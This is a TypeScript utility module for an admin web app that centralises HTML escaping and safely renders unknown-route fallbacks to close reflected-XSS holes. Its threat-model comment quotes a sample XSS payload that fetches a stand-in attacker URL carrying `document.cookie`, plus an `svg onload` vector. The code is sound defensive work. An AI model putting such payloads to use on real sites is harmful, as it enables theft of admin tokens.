/**
 * HTML-escape utility for safe interpolation into HTML strings.
 *
 * **Security context (FE-P0-002 + FIN-P1-01, Bølge 2B):**
 * Spillorama admin-web previously had 48 different `escapeHtml` implementations
 * scattered across pages, plus 27 reflected-XSS sinks where `${path}`
 * (URL-derived data) was injected into `innerHTML` without escaping.
 *
 * This module is the **single source of truth**. ALL `escapeHtml` calls in
 * `apps/admin-web/src/` must import from here — duplicate implementations
 * are blocked by `scripts/lint-no-dup-escapehtml.mjs` and the no-unsafe-html
 * lint rule.
 *
 * **Threat model:**
 * - Player display-name with `<img onerror=fetch('//attacker?'+document.cookie)>`
 *   visible in agent's player-detail page → admin token exfiltration.
 * - URL hash containing `<svg/onload=...>` triggering on unknown-route
 *   fallbacks → reflected XSS pre- or post-auth.
 * - Hall-name, agent-note, settlement-note, alert-reason — any backend-
 *   controlled string interpolated into a page rendered for another operator.
 *
 * **Behaviour:**
 * - Replaces `&`, `<`, `>`, `"`, `'` with their HTML entity equivalents.
 * - Returns `""` for `null` / `undefined` (matches the most common legacy
 *   call-sites that took `string | null | undefined`).
 * - Coerces non-string input via `String(...)` so accidental number / boolean
 *   interpolation does not crash. (Was inconsistent across the 48 legacy
 *   impls — some threw on non-string, some returned `""`.)
 *
 * **Order of replacement matters:** `&` is replaced first inside the regex
 * single-pass so `&lt;` does not get re-encoded to `&amp;lt;`.
 */

const HTML_ESCAPE_MAP: Record<string, string> = {
  "&": "&amp;",
  "<": "&lt;",
  ">": "&gt;",
  '"': "&quot;",
  "'": "&#39;",
};

const HTML_ESCAPE_REGEX = /[&<>"']/g;

export function escapeHtml(value: unknown): string {
  if (value === null || value === undefined) return "";
  return String(value).replace(HTML_ESCAPE_REGEX, (c) => HTML_ESCAPE_MAP[c] ?? c);
}

/**
 * Render the standard "Unknown {module} route: {path}" fallback used in
 * 27 admin-web route-dispatchers (FIN-P1-01). Centralised here so the
 * `path` string (URL-derived, attacker-controlled) is **always** escaped.
 *
 * Usage:
 * ```ts
 *   default:
 *     container.innerHTML = renderUnknownRoute("security", path);
 * ```
 */
export function renderUnknownRoute(moduleName: string, path: string): string {
  return `<div class="box box-danger"><div class="box-body">Unknown ${escapeHtml(moduleName)} route: ${escapeHtml(path)}</div></div>`;
}
